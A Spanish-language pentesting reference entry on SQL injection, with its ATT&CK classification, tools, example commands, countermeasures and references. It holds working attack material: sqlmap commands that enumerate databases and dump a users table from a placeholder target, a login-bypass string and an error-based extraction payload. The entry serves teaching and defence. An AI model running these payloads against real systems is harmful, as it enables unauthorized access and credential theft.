# Inyección SQL (SQLi)

## Descripción
Técnica de explotación que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Permite ver datos que normalmente no se pueden recuperar, modificar o eliminar datos, y en algunos casos, obtener acceso de administrador al servidor de la base de datos (RCE).

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **sqlmap** (`--batch`, `--dump`, `--risk`, `--level`) — herramienta automatizada para detectar y explotar fallos de inyección SQL.
- **Burp Suite** (Repeater, Intruder) — para pruebas manuales y manipulación de parámetros en tiempo real.
- **Ghmap** — herramienta para automatizar el descubrimiento de dorks relacionados con SQLi.

## Comandos / Ejemplos

### Explotación automatizada con SQLMap
```bash
# Escaneo básico de una URL con parámetros
sqlmap -u "http://target.com/products.php?id=1" --batch --dbs
# Resultado: lista las bases de datos disponibles si el parámetro es vulnerable

# Extracción de tablas de una base de datos específica
sqlmap -u "http://target.com/products.php?id=1" -D public_db --tables --batch

# Volcado de credenciales de una tabla
sqlmap -u "http://target.com/products.php?id=1" -D public_db -T users --columns --dump --batch
```

### Pruebas manuales básicas
```sql
-- Bypass de login simple
admin' OR '1'='1' --
admin' #
-- Error-based SQLi (ejemplo en WHERE clause)
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Contramedidas
- Uso de consultas preparadas (Prepared Statements) con parametrización.
- Implementación de una lista blanca (Allow-list) para la validación de entradas.
- Uso de ORMs modernos que gestionan la seguridad de las consultas por defecto.
- Aplicar el principio de menor privilegio a la cuenta de servicio de la base de datos.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
